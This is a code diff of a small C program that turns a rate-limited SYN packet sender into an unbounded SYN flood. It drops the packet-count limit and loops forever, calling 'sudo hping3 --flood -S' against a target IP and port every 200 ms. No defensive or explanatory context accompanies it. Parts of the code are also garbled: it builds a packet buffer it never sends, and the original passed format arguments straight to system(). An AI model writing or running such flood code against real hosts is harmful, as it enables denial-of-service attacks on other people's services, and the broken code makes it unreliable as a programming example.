@@ -12,7 +12,6 @@
 int main(int argc, char **argv) {
     char *dst_ip = argv[1];
     int dst_port = atoi(argv[2]);
-    int num_packets = atoi(argv[3]);
     int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
     char packet[MAX_PACKET_SIZE];
     memset(packet, 0, MAX_PACKET_SIZE);
@@ -34,19 +33,16 @@ int main(int argc, char **argv) {
     tcp.doff = sizeof(tcp) / 4;
     tcp.syn = 1;
 
-    while (num_packets == 0 || num_packets > 0) {
-        memcpy(packet, &dest_addr.sin_addr, sizeof(dest_addr.sin_addr));
-        memcpy(packet + sizeof(dest_addr.sin_addr), &tcp, sizeof(tcp));
-        if (system("sudo hping3 -c 1 --syn -p %d -d %d -E packet.bin %s > /dev/null", dst_port, packet_size, dst_ip) == -1) {
+    while (1) {
+        char command[1024];
+        sprintf(command, "sudo hping3 --flood -S -p %d -d %d %s > /dev/null", dst_port, packet_size, dst_ip);
+        if (system(command) == -1) {
             printf("Failed to send packet: %s\n", strerror(errno));
             exit(EXIT_FAILURE);
         }
         printf("Packet sent to %s:%d\n", dst_ip, dst_port);
 
-        if (num_packets > 0) {
-            num_packets--;
-        }
-        usleep(1000000); // Wait 1 second between packets
+        usleep(200000); // Wait 200 milliseconds between packets
     }
 
     return 0;
